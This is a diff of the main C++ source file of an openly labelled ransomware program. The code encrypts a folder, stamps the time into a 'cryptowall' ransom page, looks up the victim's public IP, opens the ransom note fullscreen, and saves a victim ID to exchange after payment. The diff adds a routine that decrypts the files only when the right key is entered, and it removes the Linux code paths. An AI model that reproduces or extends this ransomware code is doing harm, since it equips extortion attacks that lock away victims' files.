@@ -4,16 +4,50 @@
 #include <stdint.h>
 #include <stdlib.h>
 
-#ifdef _WIN32
 #include <Lmcons.h>
 #include <windows.h>
-#endif
 
 #include "drm.h"
 #include "base64.h" // User ID
 #include "factory.h"
 
-int main() {
+int main(int argc, char* argv[]) {
+  Factory* factory = new Factory();
+  IController* encrypter = factory->getIController();
+
+  if (argc > 0) {
+    printf("\n");
+    uint8_t key[32];
+    char digit1, digit2;
+    printf("Enter the key (64 hexadecimal digits):\n");
+    for (uint8_t i = 0; i < 32; i++) {
+      do {
+        digit1 = getchar();
+      } while (digit1 == ' ' || digit1 == '\n');
+      do {
+        digit2 = getchar();
+      } while (digit2 == ' ' || digit2 == '\n');
+      key[i] = chartohex(digit1) * 16 + chartohex(digit2);
+    }
+    printf("\nKey:\n");
+    PrintHex(key, 32);
+    printf("\n");
+
+    char c;
+    do {
+      c = getchar();
+    } while (c != '\n' && c != EOF);
+
+    printf("Are you sure you wanna decrypt?\nA wrong key will make your files unrecoverable forever");
+    printf(" (Y/n): ");
+    char opt;
+    scanf("%c", &opt);
+    if (opt == 'Y' || opt == 'y')
+      encrypter->decrypt("testfolder", key);
+    printf("%u files has been decrypted\n", encrypter->getCantDecrypted());
+    return 1;
+  }
+
   /// HIDE CONSOLE
 #ifdef _WIN32
   //FreeConsole();
@@ -22,15 +56,11 @@ int main() {
   // Remove the line below under your own risk
   //if (KillSwitch()) exit(EXIT_FAILURE);
 
-  Factory* factory = new Factory();
-  IController* encrypter = factory->getIController();
-  
   /// GENERATE KEY
   char* id; unsigned int len;
   encrypter->generateKey(id, len);
 
   /// ENCRYPT FILES
-#ifdef _WIN32
   DWORD length = UNLEN + 1;
   char username[length];
   GetUserName(username, &length);
@@ -44,10 +74,6 @@ int main() {
   // Encrypt example folder (use always two backslashes)
   encrypter->encrypt("testfolder");
   //encrypter->encrypt(D:\\);
-#else
-  // On linux use a single slash
-  //SearchFiles("../testfolder", key);
-#endif
 
   encrypter->destroyKey();
 
@@ -58,22 +84,14 @@ int main() {
   unsigned int month = timeinfo->tm_mon + 1;
 
   /// ADD DATE TO FILE
-#ifdef _WIN32
   FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
-#else
-  FILE* cryptowall = fopen("cryptowall/index.htm", "r+");
-#endif
   fseek(cryptowall, 304, SEEK_SET);
   fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
           timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 
   /// GET IP
   unsigned int ip[4];
-#ifdef _WIN32
   system("getip.bat");
-#else
-  system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");
-#endif
   FILE* loadip = fopen("ip", "r+");
   fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
   fclose(loadip);
@@ -102,16 +120,8 @@ int main() {
   fclose(cryptowall);
 
   /// SHOW MESSAGE FULLSCREEN
-#ifdef _WIN32
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
   system("fullscreen.vbs");
-#else
-  system("firefox -new-window cryptowall/index.htm &");
-  sleep(2);
-  system("xdotool key Alt+Tab");
-  sleep(1);
-  system("xdotool key F11");
-#endif
 
   // include this to the .txt
   printf("\nAfter payment, use the next id to generate your key: ");
@@ -123,5 +133,6 @@ int main() {
   fwrite(id, sizeof(uint8_t), len, idfile);
   fclose(idfile);
   delete[] id;
+  delete factory;
   return 0;
 }
